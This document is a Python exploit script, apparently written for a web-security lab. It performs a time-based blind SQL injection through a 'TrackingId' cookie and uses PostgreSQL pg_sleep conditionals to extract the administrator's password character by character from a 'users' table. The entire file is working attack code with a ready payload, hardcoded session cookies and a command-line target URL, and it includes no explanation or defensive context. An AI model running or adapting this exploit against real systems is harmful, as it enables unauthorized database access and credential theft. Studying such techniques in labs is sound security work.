import sys
import requests
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

# time-based SQLi to enumerate the administrator password
def exploit_sqli_password(url):
    password_extracted = ""
    password_length = 20 # number of characters in the password

    for i in range(1, password_length + 1):
        for j in range(32, 126): # ASCII codes (space to ~ i.e. alphanumeric characters and special characters)
            sqli_payload = "' || (SELECT CASE WHEN (username='administrator' AND ASCII(SUBSTRING(password,%s,1))='%s') THEN (SELECT pg_sleep(10)) ELSE (SELECT pg_sleep(-1)) END FROM users)--" %(i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload) # URL encode payload
            cookies_obj = {
                "TrackingId": "ZfyOB1a5xry5KtEW" + sqli_payload_encoded,
                "session": "v0NUDrz6uzj5Y5PVcqJ5osNlDGnLW9HC"
            }
            res = requests.get(url, cookies=cookies_obj, verify=False, proxies=proxies)
            
            if int(res.elapsed.total_seconds()) > 9: # found character in password
                password_extracted += chr(j)
                sys.stdout.write("\r" + password_extracted)
                sys.stdout.flush()
                break
            else: # character not in password; move on
                sys.stdout.write("\r" + password_extracted + chr(j))
                sys.stdout.flush()


def main():
    if len(sys.argv) != 2: # error trap args count
        print('[+] Usage: %s "<url>"' % sys.argv[0])
        print('[+] Example: %s "www.example.com"' % sys.argv[0])
        exit(-1)
    url = sys.argv[1]
    print("[+] Checking if tracking cookie is vulnerable to time-based blind SQLi...")
    exploit_sqli_password(url)


if __name__ == "__main__":
    main()